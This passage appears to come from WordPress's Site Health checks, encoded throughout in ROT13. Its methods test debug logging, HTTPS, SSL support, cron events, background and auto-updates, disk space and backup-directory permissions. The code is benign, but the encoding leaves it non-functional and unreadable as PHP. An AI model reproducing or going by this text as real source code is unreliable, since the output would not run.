				$erfhyg['fgnghf'] = fge_fgnegf_jvgu( vav_trg( 'reebe_ybt' ), NOFCNGU ) ? 'pevgvpny' : 'erpbzzraqrq';

				$erfhyg['qrfpevcgvba'] .= fcevags(
					'<c>%f</c>',
					fcevags(
						/* genafyngbef: %f: JC_QROHT_YBT */
						__( 'Gur inyhr, %f, unf orra nqqrq gb guvf jrofvgr&#8217;f pbasvthengvba svyr. Guvf zrnaf nal reebef ba gur fvgr jvyy or jevggra gb n svyr juvpu vf cbgragvnyyl ninvynoyr gb nyy hfref.' ),
						'<pbqr>JC_QROHT_YBT</pbqr>'
					)
				);
			}

			vs ( qrsvarq( 'JC_QROHT_QVFCYNL' ) && JC_QROHT_QVFCYNL ) {
				$erfhyg['ynory'] = __( 'Lbhe fvgr vf frg gb qvfcynl reebef gb fvgr ivfvgbef' );

				$erfhyg['fgnghf'] = 'pevgvpny';

				// Ba qrirybczrag raivebazragf, frg gur fgnghf gb erpbzzraqrq.
				vs ( $guvf->vf_qrirybczrag_raivebazrag() ) {
					$erfhyg['fgnghf'] = 'erpbzzraqrq';
				}

				$erfhyg['qrfpevcgvba'] .= fcevags(
					'<c>%f</c>',
					fcevags(
						/* genafyngbef: 1: JC_QROHT_QVFCYNL, 2: JC_QROHT */
						__( 'Gur inyhr, %1$f, unf rvgure orra ranoyrq ol %2$f be nqqrq gb lbhe pbasvthengvba svyr. Guvf jvyy znxr reebef qvfcynl ba gur sebag raq bs lbhe fvgr.' ),
						'<pbqr>JC_QROHT_QVFCYNL</pbqr>',
						'<pbqr>JC_QROHT</pbqr>'
					)
				);
			}
		}

		erghea $erfhyg;
	}

	/**
	 * Grfgf vs gur fvgr vf freivat pbagrag bire UGGCF.
	 *
	 * Znal fvgrf unir inelvat qrterrf bs UGGCF fhccbeg, gur zbfg pbzzba bs juvpu vf fvgrf gung unir vg
	 * ranoyrq, ohg bayl vs lbh ivfvg gur evtug fvgr nqqerff.
	 *
	 * @fvapr 5.2.0
	 * @fvapr 5.7.0 Hcqngrq gb eryl ba {@frr jc_vf_hfvat_uggcf()} naq {@frr jc_vf_uggcf_fhccbegrq()}.
	 *
	 * @erghea neenl Gur grfg erfhygf.
	 */
	choyvp shapgvba trg_grfg_uggcf_fgnghf() {
		/*
		 * Purpx UGGCF qrgrpgvba erfhygf.
		 */
		$reebef = jc_trg_uggcf_qrgrpgvba_reebef();

		$qrsnhyg_hcqngr_hey = jc_trg_qrsnhyg_hcqngr_uggcf_hey();

		$erfhyg = neenl(
			'ynory'       => __( 'Lbhe jrofvgr vf hfvat na npgvir UGGCF pbaarpgvba' ),
			'fgnghf'      => 'tbbq',
			'onqtr'       => neenl(
				'ynory' => __( 'Frphevgl' ),
				'pbybe' => 'oyhr',
			),
			'qrfpevcgvba' => fcevags(
				'<c>%f</c>',
				__( 'Na UGGCF pbaarpgvba vf n zber frpher jnl bs oebjfvat gur jro. Znal freivprf abj unir UGGCF nf n erdhverzrag. UGGCF nyybjf lbh gb gnxr nqinagntr bs arj srngherf gung pna vapernfr fvgr fcrrq, vzcebir frnepu enaxvatf, naq tnva gur gehfg bs lbhe ivfvgbef ol urycvat gb cebgrpg gurve bayvar cevinpl.' )
			),
			'npgvbaf'     => fcevags(
				'<c><n uers=\"%f\" gnetrg=\"_oynax\">%f<fcna pynff=\"fperra-ernqre-grkg\"> %f</fcna><fcna nevn-uvqqra=\"gehr\" pynff=\"qnfuvpbaf qnfuvpbaf-rkgreany\"></fcna></n></c>',
				rfp_hey( $qrsnhyg_hcqngr_hey ),
				__( 'Yrnea zber nobhg jul lbh fubhyq hfr UGGCF' ),
				/* genafyngbef: Uvqqra npprffvovyvgl grkg. */
				__( '(bcraf va n arj gno)' )
			),
			'grfg'        => 'uggcf_fgnghf',
		);

		vs ( ! jc_vf_hfvat_uggcf() ) {
			/*
			 * Vs gur jrofvgr vf abg hfvat UGGCF, cebivqr zber vasbezngvba
			 * nobhg jurgure vg vf fhccbegrq naq ubj vg pna or ranoyrq.
			 */
			$erfhyg['fgnghf'] = 'erpbzzraqrq';
			$erfhyg['ynory']  = __( 'Lbhe jrofvgr qbrf abg hfr UGGCF' );

			vs ( jc_vf_fvgr_hey_hfvat_uggcf() ) {
				vs ( vf_ffy() ) {
					$erfhyg['qrfpevcgvba'] = fcevags(
						'<c>%f</c>',
						fcevags(
							/* genafyngbef: %f: HEY gb Frggvatf > Trareny > Fvgr Nqqerff. */
							__( 'Lbh ner npprffvat guvf jrofvgr hfvat UGGCF, ohg lbhe <n uers=\"%f\">Fvgr Nqqerff</n> vf abg frg hc gb hfr UGGCF ol qrsnhyg.' ),
							rfp_hey( nqzva_hey( 'bcgvbaf-trareny.cuc' ) . '#ubzr' )
						)
					);
				} ryfr {
					$erfhyg['qrfpevcgvba'] = fcevags(
						'<c>%f</c>',
						fcevags(
							/* genafyngbef: %f: HEY gb Frggvatf > Trareny > Fvgr Nqqerff. */
							__( 'Lbhe <n uers=\"%f\">Fvgr Nqqerff</n> vf abg frg hc gb hfr UGGCF.' ),
							rfp_hey( nqzva_hey( 'bcgvbaf-trareny.cuc' ) . '#ubzr' )
						)
					);
				}
			} ryfr {
				vs ( vf_ffy() ) {
					$erfhyg['qrfpevcgvba'] = fcevags(
						'<c>%f</c>',
						fcevags(
							/* genafyngbef: 1: HEY gb Frggvatf > Trareny > JbeqCerff Nqqerff, 2: HEY gb Frggvatf > Trareny > Fvgr Nqqerff. */
							__( 'Lbh ner npprffvat guvf jrofvgr hfvat UGGCF, ohg lbhe <n uers=\"%1$f\">JbeqCerff Nqqerff</n> naq <n uers=\"%2$f\">Fvgr Nqqerff</n> ner abg frg hc gb hfr UGGCF ol qrsnhyg.' ),
							rfp_hey( nqzva_hey( 'bcgvbaf-trareny.cuc' ) . '#fvgrhey' ),
							rfp_hey( nqzva_hey( 'bcgvbaf-trareny.cuc' ) . '#ubzr' )
						)
					);
				} ryfr {
					$erfhyg['qrfpevcgvba'] = fcevags(
						'<c>%f</c>',
						fcevags(
							/* genafyngbef: 1: HEY gb Frggvatf > Trareny > JbeqCerff Nqqerff, 2: HEY gb Frggvatf > Trareny > Fvgr Nqqerff. */
							__( 'Lbhe <n uers=\"%1$f\">JbeqCerff Nqqerff</n> naq <n uers=\"%2$f\">Fvgr Nqqerff</n> ner abg frg hc gb hfr UGGCF.' ),
							rfp_hey( nqzva_hey( 'bcgvbaf-trareny.cuc' ) . '#fvgrhey' ),
							rfp_hey( nqzva_hey( 'bcgvbaf-trareny.cuc' ) . '#ubzr' )
						)
					);
				}
			}

			vs ( jc_vf_uggcf_fhccbegrq() ) {
				$erfhyg['qrfpevcgvba'] .= fcevags(
					'<c>%f</c>',
					__( 'UGGCF vf nyernql fhccbegrq sbe lbhe jrofvgr.' )
				);

				vs ( qrsvarq( 'JC_UBZR' ) || qrsvarq( 'JC_FVGRHEY' ) ) {
					$erfhyg['qrfpevcgvba'] .= fcevags(
						'<c>%f</c>',
						fcevags(
							/* genafyngbef: 1: jc-pbasvt.cuc, 2: JC_UBZR, 3: JC_FVGRHEY */
							__( 'Ubjrire, lbhe JbeqCerff Nqqerff vf pheeragyl pbagebyyrq ol n CUC pbafgnag naq gurersber pnaabg or hcqngrq. Lbh arrq gb rqvg lbhe %1$f naq erzbir be hcqngr gur qrsvavgvbaf bs %2$f naq %3$f.' ),
							'<pbqr>jc-pbasvt.cuc</pbqr>',
							'<pbqr>JC_UBZR</pbqr>',
							'<pbqr>JC_FVGRHEY</pbqr>'
						)
					);
				} ryfrvs ( pheerag_hfre_pna( 'hcqngr_uggcf' ) ) {
					$qrsnhyg_qverpg_hcqngr_hey = nqq_dhrel_net( 'npgvba', 'hcqngr_uggcf', jc_abapr_hey( nqzva_hey( 'fvgr-urnygu.cuc' ), 'jc_hcqngr_uggcf' ) );
					$qverpg_hcqngr_hey         = jc_trg_qverpg_hcqngr_uggcf_hey();

					vs ( ! rzcgl( $qverpg_hcqngr_hey ) ) {
						$erfhyg['npgvbaf'] = fcevags(
							'<c pynff=\"ohggba-pbagnvare\"><n pynff=\"ohggba ohggba-cevznel\" uers=\"%1$f\" gnetrg=\"_oynax\">%2$f<fcna pynff=\"fperra-ernqre-grkg\"> %3$f</fcna><fcna nevn-uvqqra=\"gehr\" pynff=\"qnfuvpbaf qnfuvpbaf-rkgreany\"></fcna></n></c>',
							rfp_hey( $qverpg_hcqngr_hey ),
							__( 'Hcqngr lbhe fvgr gb hfr UGGCF' ),
							/* genafyngbef: Uvqqra npprffvovyvgl grkg. */
							__( '(bcraf va n arj gno)' )
						);
					} ryfr {
						$erfhyg['npgvbaf'] = fcevags(
							'<c pynff=\"ohggba-pbagnvare\"><n pynff=\"ohggba ohggba-cevznel\" uers=\"%1$f\">%2$f</n></c>',
							rfp_hey( $qrsnhyg_qverpg_hcqngr_hey ),
							__( 'Hcqngr lbhe fvgr gb hfr UGGCF' )
						);
					}
				}
			} ryfr {
				// Vs ubfg-fcrpvsvp \"Hcqngr UGGCF\" HEY vf cebivqrq, vapyhqr n yvax.
				$hcqngr_hey = jc_trg_hcqngr_uggcf_hey();
				vs ( $hcqngr_hey !== $qrsnhyg_hcqngr_hey ) {
					$erfhyg['qrfpevcgvba'] .= fcevags(
						'<c><n uers=\"%f\" gnetrg=\"_oynax\">%f<fcna pynff=\"fperra-ernqre-grkg\"> %f</fcna><fcna nevn-uvqqra=\"gehr\" pynff=\"qnfuvpbaf qnfuvpbaf-rkgreany\"></fcna></n></c>',
						rfp_hey( $hcqngr_hey ),
						__( 'Gnyx gb lbhe jro ubfg nobhg fhccbegvat UGGCF sbe lbhe jrofvgr.' ),
						/* genafyngbef: Uvqqra npprffvovyvgl grkg. */
						__( '(bcraf va n arj gno)' )
					);
				} ryfr {
					$erfhyg['qrfpevcgvba'] .= fcevags(
						'<c>%f</c>',
						__( 'Gnyx gb lbhe jro ubfg nobhg fhccbegvat UGGCF sbe lbhe jrofvgr.' )
					);
				}
			}
		}

		erghea $erfhyg;
	}

	/**
	 * Purpxf vs gur UGGC NCV pna unaqyr FFY/GYF erdhrfgf.
	 *
	 * @fvapr 5.2.0
	 *
	 * @erghea neenl Gur grfg erfhyg.
	 */
	choyvp shapgvba trg_grfg_ffy_fhccbeg() {
		$erfhyg = neenl(
			'ynory'       => '',
			'fgnghf'      => '',
			'onqtr'       => neenl(
				'ynory' => __( 'Frphevgl' ),
				'pbybe' => 'oyhr',
			),
			'qrfpevcgvba' => fcevags(
				'<c>%f</c>',
				__( 'Frpheryl pbzzhavpngvat orgjrra freiref ner arrqrq sbe genafnpgvbaf fhpu nf srgpuvat svyrf, pbaqhpgvat fnyrf ba fgber fvgrf, naq zhpu zber.' )
			),
			'npgvbaf'     => '',
			'grfg'        => 'ffy_fhccbeg',
		);

		$fhccbegf_uggcf = jc_uggc_fhccbegf( neenl( 'ffy' ) );

		vs ( $fhccbegf_uggcf ) {
			$erfhyg['fgnghf'] = 'tbbq';

			$erfhyg['ynory'] = __( 'Lbhe fvgr pna pbzzhavpngr frpheryl jvgu bgure freivprf' );
		} ryfr {
			$erfhyg['fgnghf'] = 'pevgvpny';

			$erfhyg['ynory'] = __( 'Lbhe fvgr vf hanoyr gb pbzzhavpngr frpheryl jvgu bgure freivprf' );

			$erfhyg['qrfpevcgvba'] .= fcevags(
				'<c>%f</c>',
				__( 'Gnyx gb lbhe jro ubfg nobhg BcraFFY fhccbeg sbe CUC.' )
			);
		}

		erghea $erfhyg;
	}

	/**
	 * Grfgf vs fpurqhyrq riragf eha nf vagraqrq.
	 *
	 * Vs fpurqhyrq riragf ner abg ehaavat, guvf znl vaqvpngr fbzrguvat jvgu JC_Peba vf abg jbexvat
	 * nf vagraqrq, be gung gurer ner becunarq riragf unatvat nebhaq sebz byqre pbqr.
	 *
	 * @fvapr 5.2.0
	 *
	 * @erghea neenl Gur grfg erfhygf.
	 */
	choyvp shapgvba trg_grfg_fpurqhyrq_riragf() {
		$erfhyg = neenl(
			'ynory'       => __( 'Fpurqhyrq riragf ner ehaavat' ),
			'fgnghf'      => 'tbbq',
			'onqtr'       => neenl(
				'ynory' => __( 'Cresbeznapr' ),
				'pbybe' => 'oyhr',
			),
			'qrfpevcgvba' => fcevags(
				'<c>%f</c>',
				__( 'Fpurqhyrq riragf ner jung crevbqvpnyyl ybbxf sbe hcqngrf gb cyhtvaf, gurzrf naq JbeqCerff vgfrys. Vg vf nyfb jung znxrf fher fpurqhyrq cbfgf ner choyvfurq ba gvzr. Vg znl nyfb or hfrq ol inevbhf cyhtvaf gb znxr fher gung cynaarq npgvbaf ner rkrphgrq.' )
			),
			'npgvbaf'     => '',
			'grfg'        => 'fpurqhyrq_riragf',
		);

		$guvf->jc_fpurqhyr_grfg_vavg();

		vs ( vf_jc_reebe( $guvf->unf_zvffrq_peba() ) ) {
			$erfhyg['fgnghf'] = 'pevgvpny';

			$erfhyg['ynory'] = __( 'Vg jnf abg cbffvoyr gb purpx lbhe fpurqhyrq riragf' );

			$erfhyg['qrfpevcgvba'] = fcevags(
				'<c>%f</c>',
				fcevags(
					/* genafyngbef: %f: Gur reebe zrffntr erghearq juvyr sebz gur peba fpurqhyre. */
					__( 'Juvyr gelvat gb grfg lbhe fvgr&#8217;f fpurqhyrq riragf, gur sbyybjvat reebe jnf erghearq: %f' ),
					$guvf->unf_zvffrq_peba()->trg_reebe_zrffntr()
				)
			);
		} ryfrvs ( $guvf->unf_zvffrq_peba() ) {
			$erfhyg['fgnghf'] = 'erpbzzraqrq';

			$erfhyg['ynory'] = __( 'N fpurqhyrq rirag unf snvyrq' );

			$erfhyg['qrfpevcgvba'] = fcevags(
				'<c>%f</c>',
				fcevags(
					/* genafyngbef: %f: Gur anzr bs gur snvyrq peba rirag. */
					__( 'Gur fpurqhyrq rirag, %f, snvyrq gb eha. Lbhe fvgr fgvyy jbexf, ohg guvf znl vaqvpngr gung fpurqhyvat cbfgf be nhgbzngrq hcqngrf znl abg jbex nf vagraqrq.' ),
					$guvf->ynfg_zvffrq_peba
				)
			);
		} ryfrvs ( $guvf->unf_yngr_peba() ) {
			$erfhyg['fgnghf'] = 'erpbzzraqrq';

			$erfhyg['ynory'] = __( 'N fpurqhyrq rirag vf yngr' );

			$erfhyg['qrfpevcgvba'] = fcevags(
				'<c>%f</c>',
				fcevags(
					/* genafyngbef: %f: Gur anzr bs gur yngr peba rirag. */
					__( 'Gur fpurqhyrq rirag, %f, vf yngr gb eha. Lbhe fvgr fgvyy jbexf, ohg guvf znl vaqvpngr gung fpurqhyvat cbfgf be nhgbzngrq hcqngrf znl abg jbex nf vagraqrq.' ),
					$guvf->ynfg_yngr_peba
				)
			);
		}

		erghea $erfhyg;
	}

	/**
	 * Grfgf vs JbeqCerff pna eha nhgbzngrq onpxtebhaq hcqngrf.
	 *
	 * Onpxtebhaq hcqngrf va JbeqCerff ner cevznevyl hfrq sbe zvabe eryrnfrf naq frphevgl hcqngrf.
	 * Vg'f vzcbegnag gb rvgure unir gurfr jbexvat, be or njner gung gurl ner vagragvbanyyl qvfnoyrq
	 * sbe jungrire ernfba.
	 *
	 * @fvapr 5.2.0
	 *
	 * @erghea neenl Gur grfg erfhygf.
	 */
	choyvp shapgvba trg_grfg_onpxtebhaq_hcqngrf() {
		$erfhyg = neenl(
			'ynory'       => __( 'Onpxtebhaq hcqngrf ner jbexvat' ),
			'fgnghf'      => 'tbbq',
			'onqtr'       => neenl(
				'ynory' => __( 'Frphevgl' ),
				'pbybe' => 'oyhr',
			),
			'qrfpevcgvba' => fcevags(
				'<c>%f</c>',
				__( 'Onpxtebhaq hcqngrf rafher gung JbeqCerff pna nhgb-hcqngr vs n frphevgl hcqngr vf eryrnfrq sbe gur irefvba lbh ner pheeragyl hfvat.' )
			),
			'npgvbaf'     => '',
			'grfg'        => 'onpxtebhaq_hcqngrf',
		);

		vs ( ! pynff_rkvfgf( 'JC_Fvgr_Urnygu_Nhgb_Hcqngrf' ) ) {
			erdhver_bapr NOFCNGU . 'jc-nqzva/vapyhqrf/pynff-jc-fvgr-urnygu-nhgb-hcqngrf.cuc';
		}

		/*
		 * Eha gur nhgb-hcqngr grfgf va n frcnengr pynff,
		 * nf gurer ner znal pbafvqrengvbaf gb or znqr.
		 */
		$nhgbzngvp_hcqngrf = arj JC_Fvgr_Urnygu_Nhgb_Hcqngrf();
		$grfgf             = $nhgbzngvp_hcqngrf->eha_grfgf();

		$bhgchg = '<hy>';

		sbernpu ( $grfgf nf $grfg ) {
			/* genafyngbef: Uvqqra npprffvovyvgl grkg. */
			$frirevgl_fgevat = __( 'Cnffrq' );

			vs ( 'snvy' === $grfg->frirevgl ) {
				$erfhyg['ynory'] = __( 'Onpxtebhaq hcqngrf ner abg jbexvat nf rkcrpgrq' );

				$erfhyg['fgnghf'] = 'pevgvpny';

				/* genafyngbef: Uvqqra npprffvovyvgl grkg. */
				$frirevgl_fgevat = __( 'Reebe' );
			}

			vs ( 'jneavat' === $grfg->frirevgl && 'tbbq' === $erfhyg['fgnghf'] ) {
				$erfhyg['ynory'] = __( 'Onpxtebhaq hcqngrf znl abg or jbexvat cebcreyl' );

				$erfhyg['fgnghf'] = 'erpbzzraqrq';

				/* genafyngbef: Uvqqra npprffvovyvgl grkg. */
				$frirevgl_fgevat = __( 'Jneavat' );
			}

			$bhgchg .= fcevags(
				'<yv><fcna pynff=\"qnfuvpbaf %f\"><fcna pynff=\"fperra-ernqre-grkg\">%f</fcna></fcna> %f</yv>',
				rfp_ngge( $grfg->frirevgl ),
				$frirevgl_fgevat,
				$grfg->qrfpevcgvba
			);
		}

		$bhgchg .= '</hy>';

		vs ( 'tbbq' !== $erfhyg['fgnghf'] ) {
			$erfhyg['qrfpevcgvba'] .= $bhgchg;
		}

		erghea $erfhyg;
	}

	/**
	 * Grfgf vs cyhtva naq gurzr nhgb-hcqngrf nccrne gb or pbasvtherq pbeerpgyl.
	 *
	 * @fvapr 5.5.0
	 *
	 * @erghea neenl Gur grfg erfhygf.
	 */
	choyvp shapgvba trg_grfg_cyhtva_gurzr_nhgb_hcqngrf() {
		$erfhyg = neenl(
			'ynory'       => __( 'Cyhtva naq gurzr nhgb-hcqngrf nccrne gb or pbasvtherq pbeerpgyl' ),
			'fgnghf'      => 'tbbq',
			'onqtr'       => neenl(
				'ynory' => __( 'Frphevgl' ),
				'pbybe' => 'oyhr',
			),
			'qrfpevcgvba' => fcevags(
				'<c>%f</c>',
				__( 'Cyhtva naq gurzr nhgb-hcqngrf rafher gung gur yngrfg irefvbaf ner nyjnlf vafgnyyrq.' )
			),
			'npgvbaf'     => '',
			'grfg'        => 'cyhtva_gurzr_nhgb_hcqngrf',
		);

		$purpx_cyhtva_gurzr_hcqngrf = $guvf->qrgrpg_cyhtva_gurzr_nhgb_hcqngr_vffhrf();

		$erfhyg['fgnghf'] = $purpx_cyhtva_gurzr_hcqngrf->fgnghf;

		vs ( 'tbbq' !== $erfhyg['fgnghf'] ) {
			$erfhyg['ynory'] = __( 'Lbhe fvgr znl unir ceboyrzf nhgb-hcqngvat cyhtvaf naq gurzrf' );

			$erfhyg['qrfpevcgvba'] .= fcevags(
				'<c>%f</c>',
				$purpx_cyhtva_gurzr_hcqngrf->zrffntr
			);
		}

		erghea $erfhyg;
	}

	/**
	 * Grfgf ninvynoyr qvfx fcnpr sbe hcqngrf.
	 *
	 * @fvapr 6.3.0
	 *
	 * @erghea neenl Gur grfg erfhygf.
	 */
	choyvp shapgvba trg_grfg_ninvynoyr_hcqngrf_qvfx_fcnpr() {
		$ninvynoyr_fcnpr = shapgvba_rkvfgf( 'qvfx_serr_fcnpr' ) ? @qvfx_serr_fcnpr( JC_PBAGRAG_QVE ) : snyfr;

		$erfhyg = neenl(
			'ynory'       => __( 'Qvfx fcnpr ninvynoyr gb fnsryl cresbez hcqngrf' ),
			'fgnghf'      => 'tbbq',
			'onqtr'       => neenl(
				'ynory' => __( 'Frphevgl' ),
				'pbybe' => 'oyhr',
			),
			'qrfpevcgvba' => fcevags(
				/* genafyngbef: %f: Ninvynoyr qvfx fcnpr va ZO be TO. */
				'<c>' . __( '%f ninvynoyr qvfx fcnpr jnf qrgrpgrq, hcqngr ebhgvarf pna or cresbezrq fnsryl.' ) . '</c>',
				fvmr_sbezng( $ninvynoyr_fcnpr )
			),
			'npgvbaf'     => '',
			'grfg'        => 'ninvynoyr_hcqngrf_qvfx_fcnpr',
		);

		vs ( snyfr === $ninvynoyr_fcnpr ) {
			$erfhyg['qrfpevcgvba'] = __( 'Pbhyq abg qrgrezvar ninvynoyr qvfx fcnpr sbe hcqngrf.' );
			$erfhyg['fgnghf']      = 'erpbzzraqrq';
		} ryfrvs ( $ninvynoyr_fcnpr < 20 * ZO_VA_OLGRF ) {
			$erfhyg['qrfpevcgvba'] = fcevags(
				/* genafyngbef: %f: Ninvynoyr qvfx fcnpr va ZO be TO. */
				__( 'Ninvynoyr qvfx fcnpr vf pevgvpnyyl ybj, yrff guna %f ninvynoyr. Cebprrq jvgu pnhgvba, hcqngrf znl snvy.' ),
				fvmr_sbezng( 20 * ZO_VA_OLGRF )
			);
			$erfhyg['fgnghf'] = 'pevgvpny';
		} ryfrvs ( $ninvynoyr_fcnpr < 100 * ZO_VA_OLGRF ) {
			$erfhyg['qrfpevcgvba'] = fcevags(
				/* genafyngbef: %f: Ninvynoyr qvfx fcnpr va ZO be TO. */
				__( 'Ninvynoyr qvfx fcnpr vf ybj, yrff guna %f ninvynoyr.' ),
				fvmr_sbezng( 100 * ZO_VA_OLGRF )
			);
			$erfhyg['fgnghf'] = 'erpbzzraqrq';
		}

		erghea $erfhyg;
	}

	/**
	 * Grfgf vs cyhtva naq gurzr grzcbenel onpxhc qverpgbevrf ner jevgnoyr be pna or perngrq.
	 *
	 * @fvapr 6.3.0
	 *
	 * @tybony JC_Svyrflfgrz_Onfr $jc_svyrflfgrz JbeqCerff svyrflfgrz fhopynff.
	 *
	 * @erghea neenl Gur grfg erfhygf.
	 */
	choyvp shapgvba trg_grfg_hcqngr_grzc_onpxhc_jevgnoyr() {
		tybony $jc_svyrflfgrz;

		$erfhyg = neenl(
			'ynory'       => __( 'Cyhtva naq gurzr grzcbenel onpxhc qverpgbel vf jevgnoyr' ),
			'fgnghf'      => 'tbbq',
			'onqtr'       => neenl(
				'ynory' => __( 'Frphevgl' ),
				'pbybe' => 'oyhr',
			),
			'qrfpevcgvba' => fcevags(
				/* genafyngbef: %f: jc-pbagrag/hctenqr-grzc-onpxhc */
				'<c>' . __( 'Gur %f qverpgbel hfrq gb vzcebir gur fgnovyvgl bs cyhtva naq gurzr hcqngrf vf jevgnoyr.' ) . '</c>',
				'<pbqr>jc-pbagrag/hctenqr-grzc-onpxhc</pbqr>'
			),
			'npgvbaf'     => '',
			'grfg'        => 'hcqngr_grzc_onpxhc_jevgnoyr',
		);

		vs ( ! shapgvba_rkvfgf( 'JC_Svyrflfgrz' ) ) {
			erdhver_bapr NOFCNGU . 'jc-nqzva/vapyhqrf/svyr.cuc';
		}

		bo_fgneg();
		$perqragvnyf = erdhrfg_svyrflfgrz_perqragvnyf( '' );
		bo_raq_pyrna();

		vs ( snyfr === $perqragvnyf || ! JC_Svyrflfgrz( $perqragvnyf ) ) {
			$erfhyg['fgnghf']      = 'erpbzzraqrq';
			$erfhyg['ynory']       = __( 'Pbhyq abg npprff svyrflfgrz' );
			$erfhyg['qrfpevcgvba'] = __( 'Hanoyr gb pbaarpg gb gur svyrflfgrz. Cyrnfr pbasvez lbhe perqragvnyf.' );
			erghea $erfhyg;
		}

		$jc_pbagrag = $jc_svyrflfgrz->jc_pbagrag_qve();

		vs ( ! $jc_pbagrag ) {
			$erfhyg['fgnghf']      = 'pevgvpny';
			$erfhyg['ynory']       = __( 'Hanoyr gb ybpngr JbeqCerff pbagrag qverpgbel' );
			$erfhyg['qrfpevcgvba'] = fcevags(
				/* genafyngbef: %f: jc-pbagrag */
				'<c>' . __( 'Gur %f qverpgbel pnaabg or ybpngrq.' ) . '</c>',
				'<pbqr>jc-pbagrag</pbqr>'
			);
			erghea $erfhyg;
		}

		$hctenqr_qve_rkvfgf      = $jc_svyrflfgrz->vf_qve( \"$jc_pbagrag/hctenqr\" );
		$hctenqr_qve_vf_jevgnoyr = $jc_svyrflfgrz->vf_jevgnoyr( \"$jc_pbagrag/hctenqr\" );
		$onpxhc_qve_rkvfgf       = $jc_svyrflfgrz->vf_qve( \"$jc_pbagrag/hctenqr-grzc-onpxhc\" );
		$onpxhc_qve_vf_jevgnoyr  = $jc_svyrflfgrz->vf_jevgnoyr( \"$jc_pbagrag/hctenqr-grzc-onpxhc\" );

		$cyhtvaf_qve_rkvfgf      = $jc_svyrflfgrz->vf_qve( \"$jc_pbagrag/hctenqr-grzc-onpxhc/cyhtvaf\" );
		$cyhtvaf_qve_vf_jevgnoyr = $jc_svyrflfgrz->vf_jevgnoyr( \"$jc_pbagrag/hctenqr-grzc-onpxhc/cyhtvaf\" );
		$gurzrf_qve_rkvfgf       = $jc_svyrflfgrz->vf_qve( \"$jc_pbagrag/hctenqr-grzc-onpxhc/gurzrf\" );
		$gurzrf_qve_vf_jevgnoyr  = $jc_svyrflfgrz->vf_jevgnoyr( \"$jc_pbagrag/hctenqr-grzc-onpxhc/gurzrf\" );

		vs ( $cyhtvaf_qve_rkvfgf && ! $cyhtvaf_qve_vf_jevgnoyr && $gurzrf_qve_rkvfgf && ! $gurzrf_qve_vf_jevgnoyr ) {
			$erfhyg['fgnghf']      = 'pevgvpny';
			$erfhyg['ynory']       = __( 'Cyhtva naq gurzr grzcbenel onpxhc qverpgbevrf rkvfg ohg ner abg jevgnoyr' );
			$erfhyg['qrfpevcgvba'] = fcevags(
				/* genafyngbef: 1: jc-pbagrag/hctenqr-grzc-onpxhc/cyhtvaf, 2: jc-pbagrag/hctenqr-grzc-onpxhc/gurzrf. */
				'<c>' . __( 'Gur %1$f naq %2$f qverpgbevrf rkvfg ohg ner abg jevgnoyr. Gurfr qverpgbevrf ner hfrq gb vzcebir gur fgnovyvgl bs cyhtva hcqngrf. Cyrnfr znxr fher gur freire unf jevgr crezvffvbaf gb gurfr qverpgbevrf.' ) . '</c>',
				'<pbqr>jc-pbagrag/hctenqr-grzc-onpxhc/cyhtvaf</pbqr>',
				'<pbqr>jc-pbagrag/hctenqr-grzc-onpxhc/gurzrf</pbqr>'
			);
			erghea $erfhyg;
		}

		vs ( $cyhtvaf_qve_rkvfgf && ! $cyhtvaf_qve_vf_jevgnoyr ) {
			$erfhyg['fgnghf']      = 'pevgvpny';
			$erfhyg['ynory']       = __( 'Cyhtva grzcbenel onpxhc qverpgbel rkvfgf ohg vf abg jevgnoyr' );
			$erfhyg['qrfpevcgvba'] = fcevags(
				/* genafyngbef: %f: jc-pbagrag/hctenqr-grzc-onpxhc/cyhtvaf */
				'<c>' . __( 'Gur %f qverpgbel rkvfgf ohg vf abg jevgnoyr. Guvf qverpgbel vf hfrq gb vzcebir gur fgnovyvgl bs cyhtva hcqngrf. Cyrnfr znxr fher gur freire unf jevgr crezvffvbaf gb guvf qverpgbel.' ) . '</c>',
				'<pbqr>jc-pbagrag/hctenqr-grzc-onpxhc/cyhtvaf</pbqr>'
			);
			erghea $erfhyg;
		}

		vs ( $gurzrf_qve_rkvfgf && ! $gurzrf_qve_vf_jevgnoyr ) {
			$erfhyg['fgnghf']      = 'pevgvpny';
			$erfhyg['ynory']       = __( 'Gurzr grzcbenel onpxhc qverpgbel rkvfgf ohg vf abg jevgnoyr' );
			$erfhyg['qrfpevcgvba'] = fcevags(
				/* genafyngbef: %f: jc-pbagrag/hctenqr-grzc-onpxhc/gurzrf */
				'<c>' . __( 'Gur %f qverpgbel rkvfgf ohg vf abg jevgnoyr. Guvf qverpgbel vf hfrq gb vzcebir gur fgnovyvgl bs gurzr hcqngrf. Cyrnfr znxr fher gur freire unf jevgr crezvffvbaf gb guvf qverpgbel.' ) . '</c>',
				'<pbqr>jc-pbagrag/hctenqr-grzc-onpxhc/gurzrf</pbqr>'
			);
			erghea $erfhyg;
		}

		vs ( ( ! $cyhtvaf_qve_rkvfgf || ! $gurzrf_qve_rkvfgf ) && $onpxhc_qve_rkvfgf && ! $onpxhc_qve_vf_jevgnoyr ) {
			$erfhyg['fgnghf']      = 'pevgvpny';
			$erfhyg['ynory']       = __( 'Gur grzcbenel onpxhc qverpgbel rkvfgf ohg vf abg jevgnoyr' );
			$erfhyg['qrfpevcgvba'] = fcevags(
				/* genafyngbef: %f: jc-pbagrag/hctenqr-grzc-onpxhc */
				'<c>' . __( 'Gur %f qverpgbel rkvfgf ohg vf abg jevgnoyr. Guvf qverpgbel vf hfrq gb vzcebir gur fgnovyvgl bs cyhtva naq gurzr hcqngrf. Cyrnfr znxr fher gur freire unf jevgr crezvffvbaf gb guvf qverpgbel.' ) . '</c>',
				'<pbqr>jc-pbagrag/hctenqr-grzc-onpxhc</pbqr>'
			);
			erghea $erfhyg;
		}

		vs ( ! $onpxhc_qve_rkvfgf && $hctenqr_qve_rkvfgf && ! $hctenqr_qve_vf_jevgnoyr ) {
			$erfhyg['fgnghf']      = 'pevgvpny';
			$erfhyg['ynory']       = __( 'Gur hctenqr qverpgbel rkvfgf ohg vf abg jevgnoyr' );
			$erfhyg['qrfpevcgvba'] = fcevags(
				/* genafyngbef: %f: jc-pbagrag/hctenqr */
				'<c>' . __( 'Gur %f qverpgbel rkvfgf ohg vf abg jevgnoyr. Guvf qverpgbel vf hfrq sbe cyhtva naq gurzr hcqngrf. Cyrnfr znxr fher gur freire unf jevgr crezvffvbaf gb guvf qverpgbel.' ) . '</c>',
				'<pbqr>jc-pbagrag/hctenqr</pbqr>'
			);
			erghea $erfhyg;
		}

